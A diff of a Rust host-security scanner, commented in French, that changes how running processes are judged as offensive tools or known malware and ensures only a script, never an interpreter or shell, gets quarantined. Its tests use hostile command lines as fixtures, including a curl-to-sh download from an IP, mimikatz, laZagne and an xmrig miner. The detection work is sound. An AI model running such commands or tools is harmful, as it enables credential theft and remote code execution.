@@ -20,7 +20,11 @@ pub(crate) enum Geste {
         pid: Option<u32>,
         /// Son nom, prêt à montrer.
         nom: String,
+        /// Le programme du processus à la détection : relu avant de l'arrêter.
         chemin: Option<PathBuf>,
+        /// Le fichier à mettre en quarantaine : le programme, sauf un interpréteur ou un shell, jamais isolé (au plus
+        /// le script qu'il lance) ; `None` : l'arrêt seul.
+        fichier: Option<PathBuf>,
         /// Ce qui l'a désigné, gardé avec le fichier dans la quarantaine.
         detection: String,
     },
@@ -68,38 +72,150 @@ const TELECHARGES_MAX: u64 = 64 << 20;
 const TELECHARGES_NOMBRE: usize = 300;
 const SEMAINE: std::time::Duration = std::time::Duration::from_hours(7 * 24);
 
-/// Le jugement d'un programme en marche, ou `None` : (certain, raison). Un outil d'attaque connu, puis une empreinte
-/// connue de MalwareBazaar sont certains ; le reste de COM-PRG-001 (commande qui télécharge ou se cache, dossier où
-/// rien ne s'installe) est douteux.
-pub(crate) fn juger_programme(p: &EnMarche, os: Os, connu: &mut impl FnMut(&str) -> bool) -> Option<(bool, String)> {
-    if let Some(raison) = chasse::offensif(p) {
-        return Some((true, trf!("outil offensif : {raison}", "offensive tool: {raison}")));
+/// Le jugement d'un programme en marche.
+#[derive(Debug, PartialEq, Eq)]
+pub(crate) struct Jugement {
+    /// Seul le certain se bloque tout seul.
+    pub certaine: bool,
+    pub raison: String,
+    /// Le mot de la ligne de commande qui désigne le script, quand l'outil a été reconnu par un argument.
+    pub script: Option<String>,
+}
+
+/// Le jugement d'un programme en marche, ou `None`. Certain : un outil d'attaque connu reconnu au programme lui-même
+/// (son nom, son fichier, le premier mot de sa ligne), ou une empreinte connue de MalwareBazaar. Douteux : un outil
+/// reconnu seulement par un argument d'un interpréteur (`python3 laZagne.py` : le processus est Python), et le reste
+/// de COM-PRG-001 (commande qui télécharge ou se cache, dossier où rien ne s'installe).
+pub(crate) fn juger_programme(p: &EnMarche, os: Os, connu: &mut impl FnMut(&str) -> bool) -> Option<Jugement> {
+    if let Some((raison, origine)) = chasse::offensif(p) {
+        let (certaine, script) = match origine {
+            chasse::Origine::Programme => (true, None),
+            chasse::Origine::Argument(mot) => (false, Some(mot)),
+        };
+        return Some(Jugement {
+            certaine,
+            raison: trf!("outil offensif : {raison}", "offensive tool: {raison}"),
+            script,
+        });
     }
     if p.chemin.as_deref().is_some_and(&mut *connu) {
-        return Some((
-            true,
-            tr!(
+        return Some(Jugement {
+            certaine: true,
+            raison: tr!(
                 "empreinte SHA-256 connue de MalwareBazaar",
                 "SHA-256 fingerprint known to MalwareBazaar"
             )
             .to_string(),
-        ));
+            script: None,
+        });
     }
-    chasse::juger_programme(p, os).map(|s| (false, s.raison.to_string()))
+    chasse::juger_programme(p, os).map(|s| Jugement {
+        certaine: false,
+        raison: s.raison.to_string(),
+        script: None,
+    })
+}
+
+/// Les shells et autres programmes qui exécutent le code qu'on leur donne, en plus des interpréteurs de `chasse`.
+const SHELLS: [&str; 24] = [
+    "sh",
+    "bash",
+    "dash",
+    "zsh",
+    "fish",
+    "ksh",
+    "mksh",
+    "csh",
+    "tcsh",
+    "busybox",
+    "env",
+    "cmd",
+    "cscript",
+    "wscript",
+    "mshta",
+    "osascript",
+    "php",
+    "lua",
+    "luajit",
+    "deno",
+    "bun",
+    "tclsh",
+    "rscript",
+    "julia",
+];
+
+/// Un interpréteur ou un shell, quelle que soit sa version (« python3.12 », « pwsh.exe », « bash ») : jamais mis en
+/// quarantaine, ce serait casser tout Python, PowerShell ou le shell du compte (pyenv, nvm, Homebrew…).
+pub(crate) fn lance_du_code(fichier: &str) -> bool {
+    let nom = chasse::nom_de_fichier(fichier).to_ascii_lowercase();
+    if chasse::interpreteur(&nom) {
+        return true;
+    }
+    let nom = nom.strip_suffix(".exe").unwrap_or(&nom);
+    SHELLS.contains(&nom.trim_end_matches(|c: char| c.is_ascii_digit() || c == '.'))
+}
+
+/// Un chemin complet, sous Linux, macOS ou Windows, quel que soit le système où tourne le test.
+fn absolu(chemin: &str) -> bool {
+    let o = chemin.as_bytes();
+    chemin.starts_with('/')
+        || chemin.starts_with(r"\\")
+        || (o.len() > 2 && o[0].is_ascii_alphabetic() && o[1] == b':' && matches!(o[2], b'\\' | b'/'))
+}
+
+/// Le fichier à mettre en quarantaine pour ce processus : son programme, sauf un interpréteur ou un shell. Pour
+/// ceux-là, seulement le script désigné (`script`, le mot reconnu ; sinon le premier argument qui n'est pas une
+/// option), résolu en chemin complet (relatif : depuis `dossier`, le dossier de travail du processus), qui existe
+/// (`existe`) et n'est pas lui-même un interpréteur. `None` : rien à isoler, l'arrêt seul.
+pub(crate) fn a_isoler(
+    p: &EnMarche,
+    script: Option<&str>,
+    dossier: Option<&Path>,
+    existe: impl Fn(&Path) -> bool,
+) -> Option<PathBuf> {
+    let chemin = p.chemin.as_deref()?;
+    if !lance_du_code(chemin) {
+        return Some(PathBuf::from(chemin));
+    }
+    let ligne = p.ligne.as_deref().unwrap_or("");
+    let mot = script.or_else(|| ligne.split_whitespace().skip(1).find(|m| !m.starts_with('-')))?;
+    let mot = mot.trim_matches(['"', '\'']);
+    if mot.is_empty() || lance_du_code(mot) {
+        return None;
+    }
+    let fichier = if absolu(mot) {
+        PathBuf::from(mot)
+    } else {
+        dossier?.join(mot)
+    };
+    existe(&fichier).then_some(fichier)
+}
+
+/// Le dossier de travail d'un processus, pour résoudre le chemin relatif de son script (Linux seulement).
+fn dossier_de_travail(pid: u32) -> Option<PathBuf> {
+    if cfg!(target_os = "linux") {
+        std::fs::read_link(format!("/proc/{pid}/cwd")).ok()
+    } else {
+        None
+    }
 }
 
 /// La menace d'un programme en marche jugé dangereux.
-fn menace_programme(p: &EnMarche, certaine: bool, raison: String) -> Menace {
+fn menace_programme(p: &EnMarche, j: Jugement) -> Menace {
     let nom = affichable(&p.nom);
+    let raison = j.raison;
+    let dossier = dossier_de_travail(p.pid);
+    let fichier = a_isoler(p, j.script.as_deref(), dossier.as_deref(), Path::is_file);
     Menace {
         categorie: Categorie::Programmes,
-        certaine,
+        certaine: j.certaine,
         quoi: trf!("« {nom} » (PID {}) : {raison}", "“{nom}” (PID {}): {raison}", p.pid),
         cle: format!("programme:{}:{}", p.pid, p.chemin.as_deref().unwrap_or("")),
         geste: Geste::Programme {
             pid: Some(p.pid),
             nom,
             chemin: p.chemin.as_ref().map(PathBuf::from),
+            fichier,
             detection: raison,
         },
     }
@@ -133,8 +249,8 @@ fn programmes(empreintes: Option<&Empreintes>, os: Os, t: &mut Trouvees) {
     let mut cache = HashMap::new();
     for p in liste.iter().filter(|p| !intouchables.contains(&p.pid)) {
         let mut connu = |c: &str| connu_par(empreintes, &mut cache, c);
-        if let Some((certaine, raison)) = juger_programme(p, os, &mut connu) {
-            t.menaces.push(menace_programme(p, certaine, raison));
+        if let Some(j) = juger_programme(p, os, &mut connu) {
+            t.menaces.push(menace_programme(p, j));
         }
     }
     t.intouchables = intouchables;
@@ -147,7 +263,7 @@ fn programmes(empreintes: Option<&Empreintes>, os: Os, t: &mut Trouvees) {
         .menaces
         .iter()
         .filter_map(|m| match &m.geste {
-            Geste::Programme { chemin, .. } => chemin.clone(),
+            Geste::Programme { fichier, .. } => fichier.clone(),
             _ => None,
         })
         .collect();
@@ -183,7 +299,8 @@ fn programmes(empreintes: Option<&Empreintes>, os: Os, t: &mut Trouvees) {
                 geste: Geste::Programme {
                     pid: None,
                     nom: montre,
-                    chemin: Some(chemin),
+                    chemin: Some(chemin.clone()),
+                    fichier: Some(chemin),
                     detection: raison.to_string(),
                 },
             });
@@ -477,7 +594,7 @@ mod tests {
             r"C:\Users\alice\Downloads\mimikatz.exe",
             "mimikatz.exe privilege::debug",
         );
-        assert!(juger_programme(&mimikatz, Os::Windows, &mut jamais).is_some_and(|(c, _)| c));
+        assert!(juger_programme(&mimikatz, Os::Windows, &mut jamais).is_some_and(|j| j.certaine));
         let mineur = programme(
             "svc-update",
             "/home/alice/.cache/svc-update",
@@ -485,22 +602,118 @@ mod tests {
         );
         assert_eq!(juger_programme(&mineur, Os::Linux, &mut jamais), None);
         let mut connu = |c: &str| c == "/home/alice/.cache/svc-update";
-        assert!(juger_programme(&mineur, Os::Linux, &mut connu).is_some_and(|(c, r)| c && r.contains("MalwareBazaar")));
+        assert!(
+            juger_programme(&mineur, Os::Linux, &mut connu)
+                .is_some_and(|j| j.certaine && j.raison.contains("MalwareBazaar"))
+        );
         let telechargeur = programme(
             "bash",
             "/home/alice/.local/bin/bash2",
             "bash -c curl http://203.0.113.7/x | sh",
         );
-        assert!(juger_programme(&telechargeur, Os::Linux, &mut jamais).is_some_and(|(c, _)| !c));
+        assert!(juger_programme(&telechargeur, Os::Linux, &mut jamais).is_some_and(|j| !j.certaine));
         let lance = programme(
             "facture",
             "/home/alice/Downloads/facture",
             "/home/alice/Downloads/facture",
         );
-        assert!(juger_programme(&lance, Os::Linux, &mut jamais).is_some_and(|(c, _)| !c));
-        let m = menace_programme(&lance, false, "x".into());
+        assert!(juger_programme(&lance, Os::Linux, &mut jamais).is_some_and(|j| !j.certaine));
+        let m = menace_programme(
+            &lance,
+            Jugement {
+                certaine: false,
+                raison: "x".into(),
+                script: None,
+            },
+        );
         assert_eq!(m.categorie, Categorie::Programmes);
         assert!(matches!(m.geste, Geste::Programme { pid: Some(4242), .. }));
+    }
+
+    /// Défaut de la relecture : un argument qui ressemble au nom d'un outil ne rendait l'interpréteur « certain »,
+    /// et l'automatique arrêtait puis isolait Python lui-même. Un argument n'est plus qu'un doute, le nom doit être
+    /// entier, et un interpréteur n'est jamais mis en quarantaine.
+    #[test]
+    fn interpreteur_jamais_certain_par_un_argument_ni_isole() {
+        let mut jamais = |_: &str| false;
+        let pyenv = "/home/alice/.pyenv/versions/3.12.4/bin/python3.12";
+        // Un nom d'outil seulement en préfixe : rien.
+        for ligne in ["python3 sharphound_parser.py", "python3 xmrig_stats.py --jour"] {
+            assert_eq!(
+                juger_programme(&programme("python3", pyenv, ligne), Os::Linux, &mut jamais),
+                None
+            );
+        }
+        let windows = r"C:\Users\alice\AppData\Local\Programs\PowerShell\pwsh.exe";
+        assert_eq!(
+            juger_programme(
+                &programme("pwsh.exe", windows, "pwsh ./Rubeus-Audit.ps1"),
+                Os::Windows,
+                &mut jamais
+            ),
+            None
+        );
+        // Le script lui-même, par un argument : douteux, jamais certain.
+        let lazagne = programme("python3", pyenv, "python3 /home/alice/outils/laZagne.py all");
+        let j = juger_programme(&lazagne, Os::Linux, &mut jamais).unwrap();
+        assert!(!j.certaine);
+        assert_eq!(j.script.as_deref(), Some("/home/alice/outils/laZagne.py"));
+        // Ce qui est mis en quarantaine : le script désigné, jamais l'interpréteur.
+        let partout = |_: &Path| true;
+        assert_eq!(
+            a_isoler(&lazagne, j.script.as_deref(), None, partout),
+            Some(PathBuf::from("/home/alice/outils/laZagne.py"))
+        );
+        // Script relatif : résolu depuis le dossier de travail, sinon rien d'isolé (l'arrêt seul).
+        let relatif = programme("python3", pyenv, "python3 ./laZagne.py all");
+        assert_eq!(
+            a_isoler(
+                &relatif,
+                Some("./laZagne.py"),
+                Some(Path::new("/home/alice/outils")),
+                partout
+            ),
+            Some(PathBuf::from("/home/alice/outils/./laZagne.py"))
+        );
+        assert_eq!(a_isoler(&relatif, Some("./laZagne.py"), None, partout), None);
+        // Script introuvable, code passé en ligne, ou un autre interpréteur en argument : l'arrêt seul.
+        assert_eq!(a_isoler(&lazagne, j.script.as_deref(), None, |_: &Path| false), None);
+        assert_eq!(
+            a_isoler(
+                &programme("bash", "/opt/homebrew/bin/bash", "bash -c id"),
+                None,
+                None,
+                partout
+            ),
+            None
+        );
+        assert_eq!(
+            a_isoler(
+                &programme("env", "/home/alice/bin/env", "env python3 x.py"),
+                None,
+                None,
+                partout
+            ),
+            None
+        );
+        // Un programme ordinaire : son propre fichier.
+        let xmrig = programme("xmrig", "/home/alice/.cache/xmrig", "./xmrig -o pool.example:3333");
+        assert!(juger_programme(&xmrig, Os::Linux, &mut jamais).is_some_and(|j| j.certaine));
+        assert_eq!(
+            a_isoler(&xmrig, None, None, partout),
+            Some(PathBuf::from("/home/alice/.cache/xmrig"))
+        );
+        for nom in [
+            "python3.12",
+            "pwsh.exe",
+            "bash",
+            "node",
+            r"C:\Windows\System32\cmd.exe",
+            "zsh",
+        ] {
+            assert!(lance_du_code(nom), "{nom}");
+        }
+        assert!(!lance_du_code("xmrig") && !lance_du_code("facture.pdf.exe"));
     }
 
     #[test]
